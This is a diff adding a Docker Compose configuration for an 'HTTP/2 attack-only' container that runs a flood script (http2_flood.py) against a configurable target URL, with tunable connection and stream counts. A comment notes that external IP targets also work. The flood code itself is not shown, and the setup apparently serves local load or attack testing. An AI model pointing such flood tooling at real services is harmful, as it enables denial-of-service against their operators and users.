@@ -1,0 +1,24 @@
+# HTTP/2 Attack-Only Deployment
+name: http2-attack
+
+networks:
+  attack-net:
+    driver: bridge
+
+services:
+  attacker:
+    build: .
+    container_name: http2-attacker
+    environment:
+      - PYTHONUNBUFFERED=1
+      - CONNECTIONS=${CONNECTIONS:-4}
+      - STREAMS=${STREAMS:-256}
+    command: ${ATTACK_SCRIPT:-python http2_flood.py} ${TARGET_URL:-http://172.17.0.1:8080} ${CONNECTIONS:-4}
+    networks:
+      - attack-net
+    extra_hosts:
+      - "host.docker.internal:host-gateway"
+    # Bridge networking for better container isolation
+    # For local targets: 172.17.0.1:8080 (Docker bridge gateway) works on Linux
+    # host.docker.internal:8080 works on Docker Desktop (macOS/Windows) 
+    # For external targets: direct IP addresses work fine
